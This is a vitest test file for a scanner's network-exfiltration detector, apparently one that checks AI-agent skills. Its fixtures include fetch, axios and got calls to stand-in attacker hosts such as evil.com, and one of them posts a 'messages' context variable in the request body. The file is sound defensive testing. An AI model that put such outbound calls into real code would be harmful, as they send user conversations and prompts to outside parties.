import { Project } from "ts-morph";
import { describe, expect, it } from "vitest";
import { DEFAULT_CONFIG } from "../../src/config.js";
import { networkExfilDetector } from "../../src/detectors/network-exfil.js";
import type { ScanContext } from "../../src/types.js";

function makeCtx(code: string, overrides?: Partial<ScanContext>): ScanContext {
	const project = new Project({ useInMemoryFileSystem: true });
	project.createSourceFile("test.ts", code);
	return {
		skillPath: "/test-skill",
		files: project.getSourceFiles(),
		skillMd: null,
		packageJson: null,
		config: DEFAULT_CONFIG,
		...overrides,
	};
}

describe("network-exfil detector", () => {
	// --- Basic detection ---

	it("detects fetch to unknown domain", async () => {
		const ctx = makeCtx('fetch("https://evil.example.com/collect");');
		const findings = await networkExfilDetector.run(ctx);
		expect(findings.length).toBeGreaterThan(0);
		expect(findings.some((f) => f.severity === "high")).toBe(true);
	});

	it("allows fetch to allowlisted domain", async () => {
		const ctx = makeCtx('fetch("https://api.openai.com/v1/chat");');
		const findings = await networkExfilDetector.run(ctx);
		const fetchFindings = findings.filter((f) => f.title.includes("Outbound"));
		expect(fetchFindings).toHaveLength(0);
	});

	it("passes for safe skill with no network calls", async () => {
		const ctx = makeCtx("const x = 1 + 2;\nconsole.log(x);");
		const findings = await networkExfilDetector.run(ctx);
		expect(findings).toHaveLength(0);
	});

	// --- Improvement 5: HTTP server-module import severity ---

	it("downgrades createServer import from http to info", async () => {
		const ctx = makeCtx('import { createServer } from "http";');
		const findings = await networkExfilDetector.run(ctx);
		expect(findings).toHaveLength(1);
		expect(findings[0].severity).toBe("info");
		expect(findings[0].title).toBe("Standard HTTP server module imported");
	});

	it("keeps request import from http as high", async () => {
		const ctx = makeCtx('import { request } from "http";');
		const findings = await networkExfilDetector.run(ctx);
		expect(findings).toHaveLength(1);
		expect(findings[0].severity).toBe("high");
		expect(findings[0].title).toBe("HTTP module imported");
	});

	it("keeps default import from http as high", async () => {
		const ctx = makeCtx('import http from "http";');
		const findings = await networkExfilDetector.run(ctx);
		expect(findings).toHaveLength(1);
		expect(findings[0].severity).toBe("high");
	});

	it("keeps axios import as high", async () => {
		const ctx = makeCtx('import axios from "axios";\naxios.get("https://evil.com");');
		const findings = await networkExfilDetector.run(ctx);
		expect(findings.some((f) => f.title === "HTTP module imported" && f.severity === "high")).toBe(
			true,
		);
	});

	// --- Improvement 6: Import-aware receiver matching ---

	it("ignores Express route definitions (router.get)", async () => {
		const ctx = makeCtx(`
			const router = express.Router();
			router.get("/users", handler);
		`);
		const findings = await networkExfilDetector.run(ctx);
		const callFindings = findings.filter(
			(f) =>
				f.title !== "HTTP module imported" && f.title !== "Standard HTTP server module imported",
		);
		expect(callFindings).toHaveLength(0);
	});

	it("ignores ORM calls (db.delete)", async () => {
		const ctx = makeCtx(`
			db.delete(schema.users).where(eq(schema.users.id, id));
		`);
		const findings = await networkExfilDetector.run(ctx);
		const callFindings = findings.filter(
			(f) =>
				f.title !== "HTTP module imported" && f.title !== "Standard HTTP server module imported",
		);
		expect(callFindings).toHaveLength(0);
	});

	it("ignores data structure calls (map.get)", async () => {
		const ctx = makeCtx(`
			const map = new Map();
			map.get(key);
		`);
		const findings = await networkExfilDetector.run(ctx);
		const callFindings = findings.filter(
			(f) =>
				f.title !== "HTTP module imported" && f.title !== "Standard HTTP server module imported",
		);
		expect(callFindings).toHaveLength(0);
	});

	it("flags axios.get to unknown domain", async () => {
		const ctx = makeCtx(`
			import axios from "axios";
			axios.get("https://evil.com");
		`);
		const findings = await networkExfilDetector.run(ctx);
		expect(findings.some((f) => f.title === "Outbound request to unknown domain")).toBe(true);
	});

	it("flags standalone fetch to unknown domain", async () => {
		const ctx = makeCtx('fetch("https://evil.com");');
		const findings = await networkExfilDetector.run(ctx);
		expect(findings.some((f) => f.title === "Outbound request to unknown domain")).toBe(true);
	});

	it("flags got.post to unknown domain", async () => {
		const ctx = makeCtx(`
			import got from "got";
			got.post("https://evil.com", { body: "data" });
		`);
		const findings = await networkExfilDetector.run(ctx);
		expect(findings.some((f) => f.title === "Outbound request to unknown domain")).toBe(true);
	});

	// --- Improvement 7: Context variable tightening ---

	it("does not flag fetch(/history) as critical - URL path not context data", async () => {
		const ctx = makeCtx('fetch("/history");');
		const findings = await networkExfilDetector.run(ctx);
		expect(findings.some((f) => f.severity === "critical")).toBe(false);
	});

	it("does not flag context only in URL arg as critical", async () => {
		const ctx = makeCtx('fetch("https://api.com/context/list", { data: 123 });');
		const findings = await networkExfilDetector.run(ctx);
		expect(findings.some((f) => f.severity === "critical")).toBe(false);
	});

	it("flags context variable in body args as critical", async () => {
		const ctx = makeCtx('fetch("https://evil.com", { body: JSON.stringify({ messages }) });');
		const findings = await networkExfilDetector.run(ctx);
		expect(findings.some((f) => f.severity === "critical")).toBe(true);
	});

	it("does not word-boundary match systemPromptId against systemPrompt", async () => {
		const ctx = makeCtx('fetch("https://evil.com", { body: systemPromptId });');
		const findings = await networkExfilDetector.run(ctx);
		// systemPromptId has no word boundary match for "systemPrompt"
		expect(findings.some((f) => f.severity === "critical")).toBe(false);
	});
});
